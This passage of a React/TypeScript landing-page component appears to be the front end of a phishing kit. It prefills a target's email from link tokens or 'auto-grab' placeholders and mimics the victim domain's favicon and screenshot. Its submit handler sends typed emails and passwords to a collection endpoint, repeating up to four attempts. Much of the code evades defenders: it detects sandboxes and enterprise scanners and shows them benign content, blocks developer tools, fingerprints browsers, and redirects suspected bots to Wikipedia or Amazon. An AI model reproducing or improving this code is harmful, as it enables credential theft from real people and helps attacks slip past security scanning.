        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email || undefined,
          linkConfig: linkConfig,
          ip: langData.ip || '127.0.0.1',
          acceptLanguage: typeof navigator !== 'undefined' ? navigator.language : undefined,
          mode: linkConfig?.templateMode || 'auto',
        }),
      })
      
      if (templateResponse.ok) {
        const templateData = await templateResponse.json()
        
        if (templateData.success && templateData.template) {
          setTemplate(templateData.template)
          setTemplateLanguage(templateData.language || detectedLang)
          setUseTemplate(true)
        } else {
          // No template available - proceed without template (show basic form)
          console.warn('[LANDING PAGE] No template available, proceeding without template')
          setUseTemplate(false)
          setTemplate(null)
          setCheckingComplete(true) // Allow page to proceed
        }
      } else {
        // Template API failed - proceed without template
        console.warn('[LANDING PAGE] Template selection failed, proceeding without template')
        setUseTemplate(false)
        setTemplate(null)
        setCheckingComplete(true) // Allow page to proceed
      }
    } catch (error) {
      if (process.env.NODE_ENV === 'development') {
        console.error('Failed to load template:', error)
      }
      setUseTemplate(false)
    }
}, [email, isDevFastMode, language, searchParams, timedFetch])

useEffect(() => {
  // Only load if we have email and checking is complete (after bot delay)
  if (!email || !checkingComplete) {
    // ADD THIS: If waiting too long, force load anyway
    if (pageLoadTime !== null) {
      const waitingTime = Date.now() - pageLoadTime
      if (waitingTime > 20000) {  // 20 seconds
        setCheckingComplete(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
      }
    }
    
    return
  }
  
  // Don't reload if already loaded
  if (template) {
    return
  }
  
  loadTemplateAndLanguage()
}, [email, checkingComplete, loadTemplateAndLanguage, pageLoadTime, template])
  
  // Handle credential submission from template
  const handleCredentialSubmit = async (email: string, password: string) => {
    try {
      const token = searchParams.get('token')
      const id = searchParams.get('id')
      
      const response = await fetch(API_ROUTES.submitCredentials, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
          token,
          id,
          sessionId: sessionId || undefined,
        }),
      })
      
      if (response.redirected) {
        // PHASE 7.3: Only call secure-redirect for Type A and Type C
        const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
        const format = detectLinkFormat(searchParams, pathname)
        const redirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email)
        if (redirectUrl) {
          window.location.href = redirectUrl
        }
        return
      }
      
      const result = await response.json()
      
      if (result.redirect) {
        // PHASE 7.3: Only call secure-redirect for Type A and Type C
        const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
        const format = detectLinkFormat(searchParams, pathname)
        const redirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email)
        if (redirectUrl) {
          window.location.href = redirectUrl
        }
        return
      }
      
      // CRITICAL: Only mark link as used and redirect if 4 attempts are completed
      // Don't mark as used after 1-3 attempts - user should be able to return
      if (result.success && result.verified && result.attemptCount >= 4) {
        // Only mark link as used after 4 attempts completed
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('link_used', 'true')
          sessionStorage.setItem('used_email', email)
          sessionStorage.setItem('used_at', Date.now().toString())
        }
        
        // PHASE 7.3: Only call secure-redirect for Type A and Type C
        const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
        const format = detectLinkFormat(searchParams, pathname)
        const redirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email)
        if (redirectUrl) {
        // Redirect after 2 seconds
        setTimeout(() => {
            window.location.href = redirectUrl
        }, 2000)
        }
      } else if (result.success && result.attemptCount && result.attemptCount < 4) {
        // Less than 4 attempts - don't mark as used, don't redirect
        // User can continue attempts
      }
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.error('Failed to submit credentials:', error)
        }
    }
  }

  useEffect(() => {
    // Only run on client side
    if (typeof window === 'undefined') return
    
    // Check for Type B auto grab email parameters (sid, hash, v)
    // Type B links now have backend tokens, so don't skip validation
    // Just extract email from additional parameters
    const autoGrabEmailParams = {
      sid: searchParams.get('sid'),      // Session ID pattern with email
      v: searchParams.get('v'),          // Verification param with email
      hash: window.location.hash ? window.location.hash.substring(1) : null
    }
    
    // Extract email if present in auto grab params
    const hasAutoGrabEmail = Object.values(autoGrabEmailParams).some(val => val && val.trim() && !val.includes('++'))
    
    if (hasAutoGrabEmail) {
      // Extract email but continue with normal token validation
      let extractedEmail: string | null = null
      
      if (autoGrabEmailParams.sid) {
        extractedEmail = decodeEmailFromParam(autoGrabEmailParams.sid)
      } else if (autoGrabEmailParams.hash) {
        extractedEmail = decodeEmailFromHash(autoGrabEmailParams.hash)
      } else if (autoGrabEmailParams.v) {
        extractedEmail = decodeEmailFromParam(autoGrabEmailParams.v)
      }
      
      if (extractedEmail && extractedEmail.includes('@')) {
        setEmail(extractedEmail)
        const emailDomain = extractedEmail.split('@')[1]
        if (emailDomain) {
          setDomain(emailDomain)
          const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
          setFaviconUrl(favicon)
        }
      }
      
      // Continue to normal token validation - don't return
    }
    
    // MULTI-MODE FIX: Check for Type A (token without email) or Type C (mappingId + token) first
    // Extract all params at once to avoid redeclaration
    const tokenParam = searchParams.get('token')
    const emailParam = searchParams.get('email')
    const mappingIdParam = searchParams.get('mappingId')
    const idParam = searchParams.get('id')
    const sidParam = searchParams.get('sid')
    
    // Priority 1: Type A - Token without email (fetch email from database)
    // CRITICAL: Skip this if Format A resolution already happened (type=A in URL)
    // Format A resolution already set the email, so we don't need to fetch again
    const typeParam = searchParams.get('type')
    if (tokenParam && !emailParam && !idParam && typeParam !== 'A') {
      // Check if token is a short identifier (8-12 chars) - if so, use identifier parameter
      const isShortIdentifier = /^[0-9a-zA-Z]{8,12}$/.test(tokenParam)
      
      if (isShortIdentifier) {
        // It's a short identifier - use identifier parameter
        timedFetch(`/api/email-from-token?identifier=${encodeURIComponent(tokenParam)}`)
          .then(r => {
            if (!r.ok) {
              console.error('[FRONTEND] email-from-token API error (identifier):', {
                status: r.status,
                statusText: r.statusText,
              })
              return null
            }
            return r.json()
          })
          .then(data => {
            if (data?.email) {
              setEmail(data.email)
              const emailDomain = data.email.split('@')[1]
              if (emailDomain) {
                setDomain(emailDomain)
                const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
                setFaviconUrl(favicon)
                fetchScreenshotForDomain(emailDomain)
              }
            }
          })
          .catch(() => {
            // Silent fail - linkStatus validation will handle it
          })
      } else {
        // It's a long token - use token parameter
        timedFetch(`/api/email-from-token?token=${encodeURIComponent(tokenParam)}`)
          .then(r => {
            // CRITICAL FIX: Check response status before parsing JSON
            if (!r.ok) {
              console.error('[FRONTEND] email-from-token API error:', {
                status: r.status,
                statusText: r.statusText,
              })
              return null // Return null to indicate failure
            }
            return r.json()
          })
          .then(data => {
            // CRITICAL FIX: Check if data exists and has email
            if (data?.email) {
              setEmail(data.email)
              const emailDomain = data.email.split('@')[1]
              if (emailDomain) {
                setDomain(emailDomain)
                const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
                setFaviconUrl(favicon)
                fetchScreenshotForDomain(emailDomain)
              }
            }
            // PHASE 7.5: Don't redirect here - let first useEffect handle validation
            // If email not found, linkStatus will be set to 'invalid' by first useEffect
          })
          .catch(() => {
            // PHASE 7.5: Don't redirect here - let first useEffect handle validation
            // Silent fail - linkStatus validation will handle it
          })
      }
      // PHASE 7.5: NO RETURN - let the useEffect continue
    }
    
    // Priority 2: Type C - MappingId + Token (fetch email from mappingId)
    // PHASE 7.5 FIX: Don't return early - let linkStatus validation handle validity
    if (mappingIdParam && tokenParam) {
      timedFetch(`/api/email-from-mapping?mappingId=${encodeURIComponent(mappingIdParam)}`)
        .then(r => r.json())
        .then(data => {
          if (data.email) {
            setEmail(data.email)
            const emailDomain = data.email.split('@')[1]
            if (emailDomain) {
              setDomain(emailDomain)
              const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
              setFaviconUrl(favicon)
              fetchScreenshotForDomain(emailDomain)
            }
          }
          // PHASE 7.5: Don't redirect here - let first useEffect handle validation
        })
        .catch(() => {
          // PHASE 7.5: Don't redirect here - let first useEffect handle validation
          // Silent fail - linkStatus validation will handle it
        })
      // PHASE 7.5: NO RETURN - let the useEffect continue
    }
    
    // Priority 3: Legacy - Check for session token (document link with id parameter) or Type A link
    if (idParam) {
      // Try session token first (document links)
      timedFetch(`${API_ROUTES.getEmailFromToken}?id=${idParam}`)
        .then(r => {
          if (r.ok) {
            // Session token found - use it
            return r.json().then(data => {
              if (data.email) {
                setEmail(data.email)
                const emailDomain = data.email.split('@')[1]
                if (emailDomain) {
                  setDomain(emailDomain)
                  const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
                  setFaviconUrl(favicon)
                  fetchScreenshotForDomain(emailDomain)
                }
              }
            })
          } else {
            // Session token not found - try Type A link
            return timedFetch(`${API_ROUTES.getEmail}?id=${idParam}`)
              .then(r => {
                // Handle both 404 (not found) and 200 (found) responses
                if (r.status === 404) {
                  throw new Error('Invalid ID')
                }
                if (!r.ok) {
                  throw new Error(`API error: ${r.status}`)
                }
                return r.json()
              })
              .then(data => {
                if (data.email) {
                  setEmail(data.email)
                  const emailDomain = data.email.split('@')[1]
                  if (emailDomain) {
                    setDomain(emailDomain)
                    const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
                    setFaviconUrl(favicon)
                    fetchScreenshotForDomain(emailDomain)
                  }
                }
                // PHASE 7.5: Don't redirect here - let first useEffect handle validation
              })
          }
        })
        .catch(() => {
          // PHASE 7.5: Don't redirect here - let first useEffect handle validation
          // Silent fail - linkStatus validation will handle it
        })
      // PHASE 7.5: NO RETURN - let the useEffect continue
    }
    
    // Type B or old format: Use params extracted above (avoid redeclaration)
    
    // Type B Auto Grab: Extract email from additional parameters
    // Type B links NOW have backend tokens (token + id), so they go through validation
    // We just need to extract email from sid/hash/v parameters
    const typeBEmailParams = {
      sid: searchParams.get('sid'),
      v: searchParams.get('v'),
      hash: window.location.hash ? window.location.hash.substring(1) : null
    }
    
    const hasTypeBEmail = Object.values(typeBEmailParams).some(val => val && val.trim() && !val.includes('++'))
    
    if (hasTypeBEmail && tokenParam) {
      let extractedEmail: string | null = null
      
      if (typeBEmailParams.sid) {
        extractedEmail = decodeEmailFromParam(typeBEmailParams.sid)
      } else if (typeBEmailParams.hash) {
        extractedEmail = decodeEmailFromHash(typeBEmailParams.hash)
      } else if (typeBEmailParams.v) {
        extractedEmail = decodeEmailFromParam(typeBEmailParams.v)
      }
      
      if (extractedEmail && extractedEmail.includes('@')) {
        setEmail(extractedEmail)
        setDomain(extractedEmail.split('@')[1] || '')
        
        const emailDomain = extractedEmail.split('@')[1]
        if (emailDomain) {
          const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
          setFaviconUrl(favicon)
          fetchScreenshotForDomain(emailDomain)
        }
      }
      // Continue - don't return, let token validation proceed
    }
    
    // PHASE 7.5 FIX: If no token, let first useEffect handle validation
    // Don't set linkStatus here - first useEffect will set it to 'invalid' if needed
    if (!tokenParam) {
      const placeholderParams = searchParams.get('sid') || searchParams.get('v') || window.location.hash
      if (placeholderParams && (placeholderParams.includes('++email') || placeholderParams.includes('email64'))) {
        // PHASE 7.5: Don't set linkStatus here - first useEffect handles validation
        // This is just a placeholder link, first useEffect will mark as invalid
      }
      // PHASE 7.5: NO RETURN - let first useEffect handle the validation
      // Don't redirect here - first useEffect will handle it
    }
    
    // Check fingerprint if email is available (async check)
    if (emailParam && typeof window !== 'undefined') {
      // Generate client-side fingerprint (synchronous)
      let clientFingerprint = ''
      try {
        const fingerprintData = {
          screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          platform: navigator.platform,
          hardware: `${navigator.hardwareConcurrency || 'unknown'}x${(navigator as any).deviceMemory || 'unknown'}`,
          plugins: navigator.plugins.length,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack || 'unknown',
        }
        clientFingerprint = JSON.stringify(fingerprintData)
      } catch {
        clientFingerprint = `${navigator.userAgent}-${navigator.platform}`
      }
      
      // Check if this fingerprint has already completed login (INFO ONLY - don't block)
      // This is for logging/analytics, not for blocking access
      if (isDevFastMode) {
        return
      }
      timedFetch('/api/check-fingerprint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: emailParam,
          fingerprint: clientFingerprint,
          ip: 'client', // IP will be extracted server-side
        }),
      })
        .then(res => res.json())
        .then(data => {
          if (data.hasCompleted) {
            // Don't redirect - let the link status check handle validity
            // The backend will enforce single-use policy if needed
          }
        })
        .catch(() => {
          // Silent fail - continue with normal flow
        })
    }
    
    // Process email param OR auto-grabbed email
    const currentEmail = emailParam || email
    
    if (currentEmail && currentEmail.includes('@')) {
      if (!email) {
        setEmail(currentEmail)
      }
      
      // Extract domain from email
      const emailDomain = currentEmail.split('@')[1]
      if (emailDomain) {
        if (!domain) {
          setDomain(emailDomain)
        }
        
        // Set favicon
        const favicon = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=32`
        setFaviconUrl(favicon)
        
        fetchScreenshotForDomain(emailDomain)
      }
    }
  }, [searchParams, isDevFastMode, fetchScreenshotForDomain, timedFetch])

  // Update favicon in document head
  useEffect(() => {
    if (faviconUrl) {
      const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement
      if (link) {
        link.href = faviconUrl
      } else {
        const newLink = document.createElement('link')
        newLink.rel = 'icon'
        newLink.href = faviconUrl
        const head = document.getElementsByTagName('head')[0]
        head.appendChild(newLink)
        
        // Cleanup on unmount
        return () => {
          // FIX: Check if link is still in DOM before removing
          if (newLink.parentNode === head) {
            head.removeChild(newLink)
          }
        }
      }
    }
  }, [faviconUrl])

  // No longer needed - showing form directly after CAPTCHA

  const handleBotDetected = () => {
    redirectToSafeSiteWithReason('bot_detected')
  }

  // Removed handleVerified - no longer needed since we skip VerifyGate

  // Track page refreshes - only block excessive rapid refreshes, allow normal link reopening
  useEffect(() => {
    if (typeof window === 'undefined') return
    
    const refreshKey = 'page_refresh_count'
    const timestampKey = 'page_refresh_timestamp'
    const now = Date.now()
    const lastRefresh = localStorage.getItem(timestampKey)
    const timeSinceLastRefresh = lastRefresh ? now - parseInt(lastRefresh) : Infinity
    
    // Reset count if more than 5 minutes passed (normal reopening after delay)
    // This allows users to reopen links normally after hours/days
    if (timeSinceLastRefresh > 5 * 60 * 1000) {
      localStorage.setItem(refreshKey, '0')
    }
    
    // Only count rapid refreshes (within 30 seconds)
    // Normal link reopening after minutes/hours is NOT counted
    let currentCount = parseInt(localStorage.getItem(refreshKey) || '0')
    
    if (timeSinceLastRefresh < 30 * 1000) {
      // Rapid refresh within 30 seconds - count it (likely bot/scanner)
      currentCount += 1
      localStorage.setItem(refreshKey, currentCount.toString())
    } else {
      // Normal reopening after 30+ seconds - reset count (legitimate user)
      currentCount = 0
      localStorage.setItem(refreshKey, '0')
    }
    
    // Update timestamp
    localStorage.setItem(timestampKey, now.toString())
    
    // If too many rapid refreshes (5+ within 30 seconds), redirect to safe site
    // This catches bots/scanners doing rapid analysis, not normal users
    // Normal users reopening links after minutes/hours are never blocked
    if (currentCount >= 5 && timeSinceLastRefresh < 30 * 1000) {
      const safeSites = [
        'https://en.wikipedia.org/wiki/Main_Page',
        'https://www.amazon.com',
        'https://www.ebay.com',
        'https://www.apple.com',
        'https://www.google.com',
      ]
      const baseUrl = safeSites[Math.floor(Math.random() * safeSites.length)]
      const params = new URLSearchParams()
      params.set('ref', Math.random().toString(36).substring(2, 15))
      params.set('t', Date.now().toString())
      params.set('id', Math.random().toString(36).substring(2, 10))
      params.set('v', Math.random().toString(36).substring(2, 8))
      const separator = baseUrl.includes('?') ? '&' : '?'
      const finalRedirectUrl = `${baseUrl}${separator}${params.toString()}`
      // PHASE 7.3: Only call secure-redirect for Type A and Type C
      const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
      const format = detectLinkFormat(searchParams, pathname)
      const secureRedirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email)
      if (secureRedirectUrl) {
        window.location.href = secureRedirectUrl
      }
      return
    }
  }, [])

  // Show landing page after verification (moved before conditional returns to fix React Hooks rule)
  useEffect(() => {
    if (captchaVerified && checkingComplete && !showLandingPage) {
      setShowLandingPage(true)
      setIsChecking(false)
    }
  }, [captchaVerified, checkingComplete, showLandingPage])
  
  // Update checkingComplete state when sessionStorage changes (moved before conditional returns to fix React Hooks rule)
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const checkComplete = sessionStorage.getItem('checking_complete') === 'true'
      if (checkComplete !== checkingComplete) {
        setCheckingComplete(checkComplete)
      }
    }
  }, [checkingComplete])
  
  // Emergency bypass - skip all security layers
  useEffect(() => {
    if (bypassSecurity) {
      setCheckingComplete(true)
      setCaptchaVerified(true)
      setIsChecking(false)
      setShowLandingPage(true)
      setStealthVerified(true)
      
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('checking_complete', 'true')
        sessionStorage.setItem('captcha_verified', 'true')
        sessionStorage.setItem('stealth_verified', JSON.stringify({
          verified: true,
          timestamp: Date.now(),
          expiresIn: 10 * 60 * 1000,
        }))
      }
    }
  }, [bypassSecurity])
  
  // Master timeout - force progression if stuck
  useEffect(() => {
    if (captchaVerified && !checkingComplete && !bypassSecurity) {
      const masterId = setTimeout(() => {
        setCheckingComplete(true)
        setIsChecking(false)
        setShowLandingPage(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
      }, 15000)  // 15 seconds
      
      return () => clearTimeout(masterId)
    }
  }, [captchaVerified, checkingComplete, bypassSecurity])

  const handleStealthVerified = () => {
    setStealthVerified(true)
    if (typeof window !== 'undefined') {
      const stealthData = {
        verified: true,
        timestamp: Date.now(),
        expiresIn: 10 * 60 * 1000, // 10 minutes
      }
      sessionStorage.setItem('stealth_verified', JSON.stringify(stealthData))
    }
  }

  const handleCaptchaVerified = async () => {
    setCaptchaVerified(true)
    setIsChecking(true)
    
    // Clear stealth verification state when starting new CAPTCHA flow
    // This ensures stealth gate runs on each new session
    setStealthVerified(false)
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('stealth_verified')
      sessionStorage.setItem('captcha_verified', 'true')
      sessionStorage.setItem('captcha_timestamp', Date.now().toString())
    }
    if (isDevFastMode) {
      setCheckingComplete(true)
      setIsChecking(false)
      setShowLandingPage(true)
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('checking_complete', 'true')
      }
      return
    }
    
    // Check admin settings for bot delay configuration
    let delayMin = 3 // Default: 3 seconds
    let delayMax = 7 // Default: 7 seconds
    let delayEnabled = true
    
    try {
      const settingsResponse = await timedFetch('/api/admin/settings?scope=public')
      const responseData = await settingsResponse.json()
      // API returns { success: true, settings: {...} }
      const settings = responseData.settings || responseData
      
      // Check if bot delay gate is disabled
      if (settings.security?.gates?.layer3BotDelay === false) {
        delayEnabled = false
      }
      
      // Check if bot delay feature itself is disabled
      if (settings.security?.botDelay?.enabled === false) {
        delayEnabled = false
      }
      
      // Get configured delay values from settings
      if (settings.security?.botDelay?.min) {
        delayMin = settings.security.botDelay.min
      }
      if (settings.security?.botDelay?.max) {
        delayMax = settings.security.botDelay.max
      }
    } catch (error) {
      if (process.env.NODE_ENV === 'development') {
        console.error('Bot delay settings check error:', error)
      }
      // Fail secure - use defaults
    }
    
    // Calculate random delay (in milliseconds)
    const randomDelay = delayEnabled 
      ? Math.floor(Math.random() * (delayMax - delayMin) * 1000) + (delayMin * 1000)
      : 0 // No delay if disabled
    
    // Enhanced bot detection during delay
    const performBotDetection = async () => {
      try {
        // ADD TIMEOUT: 5 seconds max
        if (isDevFastMode) {
          setCheckingComplete(true)
          setIsChecking(false)
          setShowLandingPage(true)
          if (typeof window !== 'undefined') {
            sessionStorage.setItem('checking_complete', 'true')
          }
          return
        }
        const controller = new AbortController()
        const timeoutId = setTimeout(() => {
          controller.abort()
        }, 5000)
        
        // Generate fingerprint for enhanced detection
        const fingerprint = await generateEnhancedFingerprint()
        
        // Check with bot detection API
        const response = await timedFetch(API_ROUTES.botFilter, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fingerprint,
            timestamp: Date.now(),
            captchaVerified: true,
          }),
          cache: 'no-store',
          signal: controller.signal,  // ← ADD TIMEOUT SUPPORT
        })
        
        clearTimeout(timeoutId)  // ← CLEAR TIMEOUT IF SUCCESS
        
        if (response.redirected) {
          // Bot detected - redirect to safe site
          redirectToSafeSiteWithReason('bot_detected')
          return
        }
        
        const data = await response.json()
        if (!data.ok || !data.passed) {
          // Bot detected - redirect
          redirectToSafeSiteWithReason('bot_detected')
          return
        }
        
        // Legitimate user - show landing page after delay
        // Mark checking as complete immediately to allow flow to proceed
        setCheckingComplete(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
        
        setTimeout(() => {
          setIsChecking(false)
          setShowLandingPage(true)
        }, randomDelay)
      } catch (error) {
        // CRITICAL FIX: Fail open instead of redirecting
        if (process.env.NODE_ENV === 'development') {
          console.error('Bot detection error:', error)
        }
        
        // Proceed anyway on error (fail open)
        setCheckingComplete(true)
        setIsChecking(false)
        setShowLandingPage(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
      }
    }
    
    // Start bot detection immediately
    performBotDetection()
  }
  
  // Enhanced fingerprint generation for bot detection
  const generateEnhancedFingerprint = async (): Promise<string> => {
    if (typeof window === 'undefined') return ''
    
    const fingerprint = {
      screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
      platform: navigator.platform,
      hardware: `${navigator.hardwareConcurrency || 'unknown'}x${(navigator as any).deviceMemory || 'unknown'}`,
      plugins: navigator.plugins.length,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || 'unknown',
      timestamp: Date.now(),
    }
    
    return JSON.stringify(fingerprint)
  }

  // Layer 0: Sandbox Detection - Show benign page if detected (BEFORE all other checks)
  if (showBenign && benignTemplate) {
    return (
      <>
        <DevToolsBlocker />
        <iframe
          src={benignTemplate}
          className="w-full h-screen border-0"
          title="Benign Content"
          sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
        />
      </>
    )
  }

  // REMOVED: Sandbox detection loading screen
  // Backend handles sandbox detection - no need for frontend loading screen
  // If sandbox check not complete, proceed anyway (backend will handle it)

  // Show CAPTCHA gate first if not verified
  // CRITICAL FIX: Only show gates if linkStatus is valid
  if (!captchaVerified && linkStatus === 'valid') {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={handleBotDetected}>
          <CaptchaGateWrapper onVerified={handleCaptchaVerified} />
        </BotFilterGate>
      </>
    )
  }

  // REMOVED: "Verifying" loading screen during bot delay
  // Backend handles verification - no need for frontend "Verifying" screen
  // Bot delay happens silently in background, then proceed to stealth gate

  // Show stealth verification gate (BEFORE showing actual form)
  // CRITICAL: This gate respects admin settings.security.gates.layer4StealthVerification
  // If disabled in settings, StealthVerificationGate will auto-verify
  // CRITICAL FIX: Only show gates if linkStatus is valid
  if (!stealthVerified && !bypassSecurity && linkStatus === 'valid') {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={handleBotDetected}>
          <StealthVerificationGate 
            onVerified={handleStealthVerified}
            email={email}
            domain={domain}
            loadingScreenId={loadingScreenId}
            duration={loadingDuration}
            language={templateLanguage}
          />
        </BotFilterGate>
      </>
    )
  }
  
  // Main landing page
  
  // ============================================
  // FORMAT A: Show loading while resolving identifier
  // ============================================
  if (formatAResolving) {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
            <p className="text-gray-600 dark:text-gray-400">Resolving link...</p>
          </div>
        </div>
      </>
    )
  }
  
  // Show error page for invalid links (including auto grab links with placeholders)
  if (linkStatus === 'invalid') {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="max-w-lg w-full text-center p-8 bg-white dark:bg-gray-800 rounded-lg shadow-lg">
            <div className="w-16 h-16 bg-red-100 dark:bg-red-900 rounded-full flex items-center justify-center mx-auto mb-4">
              <X className="w-8 h-8 text-red-600 dark:text-red-400" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">
              Invalid Link
            </h1>
            <p className="text-gray-600 dark:text-gray-400 mb-6">
              This link is invalid or has expired. Please check the link and try again.
            </p>
            {/* Help text for auto grab placeholder detection */}
            {searchParams.get('t')?.includes('++email') || 
             searchParams.get('a')?.includes('++email') ||
             searchParams.get('email')?.includes('++email') ||
             searchParams.get('e')?.includes('++email') ||
             searchParams.get('target')?.includes('++email') ||
             (typeof window !== 'undefined' && window.location.hash.includes('++email')) ? (
              <div className="mt-6 p-4 bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800/30 rounded-lg text-left">
                <p className="text-sm text-blue-800 dark:text-blue-200 font-semibold mb-2">
                  ℹ️ This is a template auto-grab link
                </p>
                <p className="text-xs text-blue-700 dark:text-blue-300">
                  The <code className="bg-blue-100 dark:bg-blue-800 px-1 rounded">++email64++</code> placeholder needs to be replaced with an actual email address (or base64 encoded email) by your email sender before sharing this link.
                </p>
              </div>
            ) : null}
          </div>
        </div>
      </>
    )
  }

  // Show completion page if link was already used
  if (showCompletionPage) {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="max-w-md w-full text-center p-8 bg-white dark:bg-gray-800 rounded-lg shadow-lg">
            <div className="w-16 h-16 bg-green-100 dark:bg-green-900 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-green-600 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">
              Review Completed
            </h1>
            <p className="text-gray-600 dark:text-gray-300 mb-6">
              Thank you for your submission. This link has been used and is no longer valid.
            </p>
            <p className="text-sm text-gray-500 dark:text-gray-400">
              You can close this window.
            </p>
          </div>
        </div>
      </>
    )
  }

  // ============================================================================
  // SECURITY NOTE: Templates ONLY render AFTER all security layers pass:
  // 1. ✅ Sandbox Detection (Layer 0) - Respects settings
  // 2. ✅ Bot Filter Gate (Layer 1) - Respects settings.security.gates.layer1BotFilter
  // 3. ✅ CAPTCHA Gate (Layer 2) - Respects settings.security.gates.layer2Captcha
  // 4. ✅ Bot Delay (Layer 3) - Respects settings.security.gates.layer3BotDelay
  // 5. ✅ Stealth Verification (Layer 4) - Respects settings.security.gates.layer4StealthVerification
  // 
  // Templates DO NOT bypass any security layers. All gates are enforced.
  // Admin can disable individual gates via Settings → Security tab.
  // ============================================================================
  
  // ONLY NOW show the actual login form (after ALL security checks pass)
  // Consolidated loading screen component to avoid duplication
  const loadingScreenProps = {
    title: "Loading...",
    subtitle: "Preparing your secure document access",
    email: email || undefined,
  }
  
  // ============================================
  // OPTION C: ADAPTIVE CONTENT RENDERING - Show standard content for enterprise environments
  // ============================================
  if (shouldRenderSafe && scannerDetected) {
    const adaptiveConfig = getAdaptiveRenderConfig(scannerType)
    return (
      <>
        <DevToolsBlocker />
        <div
          dangerouslySetInnerHTML={{ __html: adaptiveConfig.standardContentTemplate }}
          style={{ minHeight: '100vh' }}
        />
      </>
    )
  }
  
  // Show template if available (after all security checks pass)
  // CRITICAL: For Format A, email is resolved BEFORE this point, so it should always be available
  // FORMAT A: Ensure formatAResolved is true before rendering (prevents race condition)
  if (checkingComplete && email && template && formatAResolved) {
    // Get token for cloaking
    const tokenParam = searchParams.get('token')
    const currentToken = tokenParam || (typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('token') : null)
    
    // Generate fingerprint for cloaking
    const generateFingerprint = () => {
      if (typeof window === 'undefined') return undefined
      return JSON.stringify({
        screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: Date.now(),
      })
    }
    
    // DEBUG: Log email state for Format A verification
    if (process.env.NODE_ENV === 'development') {
      console.log('[FORMAT-A-VERIFY] Rendering template with email:', {
        email: email.substring(0, 20),
        hasEmail: !!email,
        emailLength: email.length,
        templateProvider: template.provider,
      })
    }
    
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={handleBotDetected}>
          <SecureTemplateContainer
            template={template}
            email={email}
            token={currentToken || undefined}
            fingerprint={generateFingerprint()}
            enableCloaking={true}
            mutationLevel="apt"
            scannerType={scannerType}
            onBehaviorTracked={(behavior: any) => {
              // Send behavior data to backend
              if (process.env.NODE_ENV === 'development') {
                console.log('[BEHAVIOR-TRACKED]', behavior)
              }
            }}
          >
            {/* FORMAT A: Visual confirmation that email is resolved and displayed */}
            {email && process.env.NODE_ENV === 'development' && (
              <div className="fixed top-4 right-4 bg-green-100 border border-green-400 text-green-700 px-3 py-2 rounded text-xs z-50">
                ✓ Email resolved: {email.substring(0, 20)}...
              </div>
            )}
          <GenericTemplateRenderer
            template={template}
            language={templateLanguage}
            email={email || ''}
            onSubmit={handleCredentialSubmit}
            onError={(error) => {
              if (process.env.NODE_ENV === 'development') {
                console.error('Template error:', error)
              }
            }}
          />
